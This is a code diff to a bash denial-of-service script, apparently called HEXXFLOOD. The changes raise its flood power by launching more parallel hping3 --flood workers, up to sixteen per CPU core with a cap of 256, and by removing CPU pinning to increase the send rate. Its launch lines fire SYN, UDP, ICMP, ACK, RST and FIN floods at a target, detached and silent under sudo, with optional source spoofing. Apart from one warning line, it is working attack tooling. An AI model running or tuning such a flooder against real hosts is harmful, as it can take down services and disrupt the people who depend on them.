@@ -477,8 +477,8 @@ set_mode() {
 # already sends as fast as a CPU core allows, so throughput scales with CPU CORES,
 # NOT with process count. The old THREADS×types model (hundreds of procs) thrashed
 # the scheduler and overran the NIC TX queue (ENOBUFS) → it sent *less*. Here we
-# fully saturate every core (and then some) for genuine full power:
-#   easy 1×  medium 2×  high 3×  extreme 4× cores.
+# run many parallel floods for genuine full power:
+#   easy 2×  medium 4×  high 8×  extreme 16× cores.
 # Set HEXXFLOOD_WORKERS=N to force an exact, UNCAPPED worker count yourself.
 compute_flood_workers() {
     local cores; cores=$(nproc 2>/dev/null); [[ "$cores" =~ ^[0-9]+$ ]] || cores=2
@@ -491,33 +491,31 @@ compute_flood_workers() {
         return
     fi
     case "${MODE:-custom}" in
-        easy)    FLOOD_WORKERS=$cores ;;
-        medium)  FLOOD_WORKERS=$(( cores * 2 )) ;;
-        high)    FLOOD_WORKERS=$(( cores * 3 )) ;;
-        extreme) FLOOD_WORKERS=$(( cores * 4 )) ;;
-        *)       FLOOD_WORKERS=$(( cores * 3 )) ;;   # custom
+        easy)    FLOOD_WORKERS=$(( cores * 2 )) ;;
+        medium)  FLOOD_WORKERS=$(( cores * 4 )) ;;
+        high)    FLOOD_WORKERS=$(( cores * 8 )) ;;
+        extreme) FLOOD_WORKERS=$(( cores * 16 )) ;;
+        *)       FLOOD_WORKERS=$(( cores * 8 )) ;;   # custom
     esac
     [ "$FLOOD_WORKERS" -lt 1 ] && FLOOD_WORKERS=1
-    # Ceiling only for the auto modes: past ~4×cores throughput drops from thrash.
-    [ "$FLOOD_WORKERS" -gt 64 ] && FLOOD_WORKERS=64
+    # Generous ceiling for the auto modes; use HEXXFLOOD_WORKERS to exceed it.
+    [ "$FLOOD_WORKERS" -gt 256 ] && FLOOD_WORKERS=256
 }
 
-# Launch ONE silent hping3 --flood worker for a type/port, pinned round-robin to a
-# CPU core (taskset) so every core runs flat-out with no migration overhead.
-# --flood transmits as fast as possible and ignores -i, so no interval is passed.
+# Launch ONE silent hping3 --flood worker for a type/port. NOTE: we deliberately
+# do NOT pin with taskset — pinning the flood loops can starve the kernel's own
+# network-transmit softirqs on those cores and cap the real send rate. Letting
+# the scheduler place them freely gives higher throughput. --flood transmits as
+# fast as possible and ignores -i, so no interval is passed.
 launch_flood() {
-    local t="$1" p="$2" pin=""
-    if command -v taskset >/dev/null 2>&1 && [ "${CORES:-1}" -gt 0 ]; then
-        pin="taskset -c $(( FLOOD_IDX % CORES ))"
-        FLOOD_IDX=$(( FLOOD_IDX + 1 ))
-    fi
+    local t="$1" p="$2"
     case "$t" in
-        syn)  sudo $DETACH $pin hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
-        udp)  sudo $DETACH $pin hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
-        icmp) sudo $DETACH $pin hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
-        ack)  sudo $DETACH $pin hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
-        rst)  sudo $DETACH $pin hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
-        fin)  sudo $DETACH $pin hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        syn)  sudo $DETACH hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        udp)  sudo $DETACH hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        icmp) sudo $DETACH hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        ack)  sudo $DETACH hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        rst)  sudo $DETACH hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
+        fin)  sudo $DETACH hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE $TARGET </dev/null >/dev/null 2>&1 & ;;
     esac
 }
 
@@ -848,7 +846,7 @@ main() {
     echo "  Mode: ${MODE:-custom}"
     echo "  Attack Types: ${ATTACK_TYPES:-all}"
     echo "  Packet Size: $PACKET_SIZE bytes"
-    echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers, core-pinned across ${CORES} CPU cores$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
+    echo -e "  Flood Power: ${GREEN}${FLOOD_WORKERS}${NC} parallel hping3 --flood workers (${CORES} CPU cores)$([ "${WORKERS_FORCED:-0}" = 1 ] && echo " (forced)")"
     echo "  Duration: ${ATTACK_DURATION:-Infinite}"
     echo ""
     echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
@@ -911,8 +909,7 @@ main() {
         # Run at least one worker per work item so every type/port is covered.
         [ "$FLOOD_WORKERS" -lt "$nspec" ] && FLOOD_WORKERS=$nspec
 
-        # Spawn the pool, round-robining work items and core pins across workers.
-        FLOOD_IDX=0
+        # Spawn the pool, round-robining the work items across workers.
         local w spec
         for (( w = 0; w < FLOOD_WORKERS; w++ )); do
             spec=${specs[$(( w % nspec ))]}
